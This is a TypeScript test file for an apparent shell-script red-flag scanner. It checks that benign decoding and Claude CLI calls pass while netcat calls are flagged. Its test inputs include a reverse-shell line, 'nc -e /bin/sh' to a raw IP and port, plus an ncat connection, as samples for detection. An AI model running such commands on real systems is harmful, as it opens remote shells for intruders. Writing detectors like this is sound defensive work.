import assert from "node:assert/strict";
import { test } from "node:test";

import { scanRedFlags } from "./redflags";

test("openssl enc is not netcat", () => {
  const script = `#!/bin/bash
tmpf=$(mktemp)
base64 -d "$tmpf.b64" > "$tmpf.tgz" 2>/dev/null ||
  base64 -D -i "$tmpf.b64" -o "$tmpf.tgz" 2>/dev/null ||
  openssl enc -base64 -d -A -in "$tmpf.b64" -out "$tmpf.tgz"
tar xzf "$tmpf.tgz" -C "$HOME/.claude/statuslines"
`;
  assert.deepEqual(scanRedFlags(script), []);
});

test("real netcat still flags", () => {
  const flags = scanRedFlags(`nc -e /bin/sh 10.0.0.5 4444`);
  assert.ok(flags.some((f) => f.label.startsWith("network call to a raw IP")));
});

test("ncat still flags", () => {
  const flags = scanRedFlags(`ncat 10.0.0.5 4444`);
  assert.ok(flags.some((f) => f.label.startsWith("network call to a raw IP")));
});

test("statusline calling the user's claude CLI is not flagged", () => {
  const script = `input=$(cat)
out=$(claude -p "say something nice" --model haiku 2>/dev/null | head -n 1)
printf '%s' "$out"
`;
  assert.deepEqual(scanRedFlags(script), []);
});
